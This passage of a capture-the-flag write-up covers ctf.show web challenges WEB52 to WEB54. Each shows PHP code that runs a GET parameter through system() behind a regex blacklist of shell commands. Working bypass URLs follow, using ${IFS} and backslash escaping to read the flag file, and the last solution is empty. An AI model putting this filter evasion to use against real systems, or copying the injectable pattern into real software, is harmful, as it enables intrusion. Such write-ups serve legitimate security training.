# @Last Modified time: 2020-09-05 22:50:30
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

```php
http://22058a52-1ccb-4cdd-b345-585108f54e44.challenge.ctf.show/?c=nl${IFS}fla\g.php||
```

<figure><img src="../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:orange;">(25)WEB53</mark>

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 18:21:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>

```php
http://9230984a-f7d7-4a49-8d1d-63f9f28fa8c4.challenge.ctf.show/?c=nl${IFS}fla\g.php
```

<figure><img src="../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:orange;">(26)WEB54</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 19:43:42
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>

```php
```
